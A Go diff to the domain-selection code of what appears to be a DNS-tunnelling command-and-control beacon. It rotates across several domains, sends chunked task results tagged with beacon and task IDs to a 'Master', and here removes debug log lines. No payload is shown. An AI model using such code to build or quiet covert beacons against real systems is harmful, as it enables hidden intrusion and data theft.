@@ -58,11 +58,6 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 	c.mutex.Lock()
 	defer c.mutex.Unlock()
 
-	// DEBUG: Log configured domains on first call
-	if c.lastDomain == "" && len(domains) > 1 {
-		fmt.Printf("[DNS] Shadow Mesh: %d domains configured: %v\n", len(domains), domains)
-	}
-
 	// Single domain case - no selection needed
 	if len(domains) == 1 {
 		c.lastDomain = domains[0]
@@ -91,7 +86,6 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 	if len(availableDomains) == 0 {
 		availableDomains = domains
 		c.failedDomains = make(map[string]time.Time)
-		fmt.Printf("[DNS] All domains were failed, resetting\n")
 	}
 
 	// CRITICAL: Exclude last used domain to force rotation (Shadow Mesh)
@@ -148,17 +142,8 @@ func (c *DNSClient) selectDomain(taskID string) (string, error) {
 		}
 	}
 
-	// DEBUG: Log domain selection for troubleshooting
-	fmt.Printf("[DNS] Selected: %s (prev: %s, available: %d/%d, mode: %s)\n", 
-		selectedDomain, lastUsed, len(availableDomains), len(domains), mode)
-
 	// Store the selected domain as the last used
 	c.lastDomain = selectedDomain
-
-	// NOTE: Task domain mapping removed to enable proper load balancing
-	// Each chunk can go to a different DNS server for distributed processing
-	// The chunk format (DATA|beaconID|taskID|chunkIndex|data) contains all
-	// necessary metadata for the Master to reassemble results from any server
 
 	return selectedDomain, nil
 }
@@ -234,7 +219,6 @@ func (c *DNSClient) markDomainFailed(domain string) {
 	c.mutex.Lock()
 	c.failedDomains[domain] = time.Now()
 	c.mutex.Unlock()
-	fmt.Printf("[DNS] Domain marked as failed (will retry in 2min): %s\n", domain)
 }
 
 // encodeCommand encrypts and encodes a command string for DNS transmission
